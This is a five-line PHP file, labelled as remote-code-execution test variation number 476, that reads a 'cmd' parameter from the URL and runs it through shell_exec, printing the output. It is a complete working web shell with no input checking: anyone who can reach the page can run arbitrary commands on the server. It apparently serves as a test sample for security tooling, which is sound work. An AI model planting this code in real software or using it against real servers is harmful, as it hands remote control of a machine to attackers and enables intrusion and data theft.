<?php
// RCE test variation #476
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>